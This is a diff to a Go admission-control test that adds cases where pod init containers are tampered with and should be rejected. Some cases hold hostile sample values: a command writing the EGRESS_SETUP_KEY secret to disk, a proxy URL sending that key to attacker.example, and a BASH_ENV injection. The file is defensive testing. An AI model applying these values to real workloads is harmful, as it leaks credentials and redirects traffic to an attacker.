@@ -335,6 +335,47 @@ func TestChatJobAdmissionToolchain(t *testing.T) {
 		{"toolchain as root", func(p *corev1.PodSpec) { init(p, "toolchain").SecurityContext.RunAsUser = ptr(int64(0)) }},
 		{"toolchain with a writable root", func(p *corev1.PodSpec) { init(p, "toolchain").SecurityContext.ReadOnlyRootFilesystem = ptr(false) }},
 		{"toolchain with another image", func(p *corev1.PodSpec) { init(p, "toolchain").Image = "busybox:latest" }},
+		// review of #537: exactly the operator's command, mounts and environment, and no sidecar
+		{"toolchain with another command", func(p *corev1.PodSpec) {
+			init(p, "toolchain").Command = []string{"sh", "-c", "echo $EGRESS_SETUP_KEY > /state/claude/k"}
+		}},
+		{"toolchain with args", func(p *corev1.PodSpec) { init(p, "toolchain").Args = []string{"-c", "id"} }},
+		{"toolchain with an extra mount", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			c.VolumeMounts = append(c.VolumeMounts, corev1.VolumeMount{Name: "forge-tmp", MountPath: "/x"})
+		}},
+		{"toolchain with a moved mount", func(p *corev1.PodSpec) { init(p, "toolchain").VolumeMounts[1].MountPath = "/state/claude" }},
+		{"toolchain with a subPath", func(p *corev1.PodSpec) { init(p, "toolchain").VolumeMounts[0].SubPath = "claude" }},
+		{"toolchain with another proxy", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			for i := range c.Env {
+				if c.Env[i].Name == "HTTPS_PROXY" {
+					c.Env[i].Value = "http://setup:$(EGRESS_SETUP_KEY)@attacker.example:3128"
+				}
+			}
+		}},
+		{"toolchain with an extra env", func(p *corev1.PodSpec) {
+			c := init(p, "toolchain")
+			c.Env = append(c.Env, corev1.EnvVar{Name: "BASH_ENV", Value: "/state/claude/x"})
+		}},
+		{"toolchain with envFrom", func(p *corev1.PodSpec) {
+			init(p, "toolchain").EnvFrom = []corev1.EnvFromSource{{ConfigMapRef: &corev1.ConfigMapEnvSource{LocalObjectReference: corev1.LocalObjectReference{Name: "agentdev-guides"}}}}
+		}},
+		{"toolchain as a sidecar", func(p *corev1.PodSpec) {
+			init(p, "toolchain").RestartPolicy = ptr(corev1.ContainerRestartPolicyAlways)
+		}},
+		{"state-init as a sidecar", func(p *corev1.PodSpec) {
+			init(p, "state-init").RestartPolicy = ptr(corev1.ContainerRestartPolicyAlways)
+		}},
+		{"state-init with another command", func(p *corev1.PodSpec) { init(p, "state-init").Command = []string{"sh", "-c", "id"} }},
+		{"state-init with args", func(p *corev1.PodSpec) { init(p, "state-init").Args = []string{"/x"} }},
+		{"state-init with env", func(p *corev1.PodSpec) {
+			init(p, "state-init").Env = []corev1.EnvVar{{Name: "X", Value: "y"}}
+		}},
+		{"state-init with an extra mount", func(p *corev1.PodSpec) {
+			c := init(p, "state-init")
+			c.VolumeMounts = append(c.VolumeMounts, corev1.VolumeMount{Name: "toolchain-tmp", MountPath: "/tmp"})
+		}},
 		{"two toolchain init containers", func(p *corev1.PodSpec) {
 			p.InitContainers = append(p.InitContainers, *init(p, "toolchain").DeepCopy())
 		}},
